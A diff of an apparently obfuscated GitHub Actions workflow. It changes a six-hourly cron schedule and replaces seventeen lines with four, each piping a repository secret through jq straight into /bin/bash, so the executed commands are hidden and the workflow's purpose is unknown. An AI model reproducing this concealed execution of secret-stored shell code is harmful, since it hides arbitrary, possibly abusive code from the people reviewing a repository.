@@ -1,34 +1,20 @@
 name: yutingqqq
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 1/6 * * *'
+    - cron: '7 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yutingqqq
         env:
-          jluo56728: ${{ secrets.jluo56728 }}
+          b7346: ${{ secrets.b7346 }}
         run: |
-          echo $jluo56728 | jq -r .tgkr48695 | /bin/bash
-          echo $f44536 | jq -r .wvpqz38856 | /bin/bash
-          echo $z23340 | jq -r .ibkv59823 | /bin/bash
-          echo $cy2 | jq -r .qk3954 | /bin/bash
-          echo $up0 | jq -r .kn1 | /bin/bash
-          echo $seby89 | jq -r .w2204 | /bin/bash
-          echo $tztd4231 | jq -r .j29501 | /bin/bash
-          echo $od12366 | jq -r .u096 | /bin/bash
-          echo $evse3 | jq -r .xetkc679 | /bin/bash
-          echo $uxxz3430 | jq -r .kmylf57853 | /bin/bash
-          echo $fls0813 | jq -r .bmj5 | /bin/bash
-          echo $n04882 | jq -r .uvhl13828 | /bin/bash
-          echo $c1313 | jq -r .d2 | /bin/bash
-          echo $yen83 | jq -r .w04 | /bin/bash
-          echo $ak41 | jq -r .lfty04 | /bin/bash
-          echo $zat154 | jq -r .l98389 | /bin/bash
-          echo $pcrg259 | jq -r .aluu54947 | /bin/bash
+          echo $b7346 | jq -r .dlekj7 | /bin/bash
+          echo $em95 | jq -r .fyjh0759 | /bin/bash
+          echo $q6282 | jq -r .ql51237 | /bin/bash
+          echo $p37551 | jq -r .jaz1 | /bin/bash
 
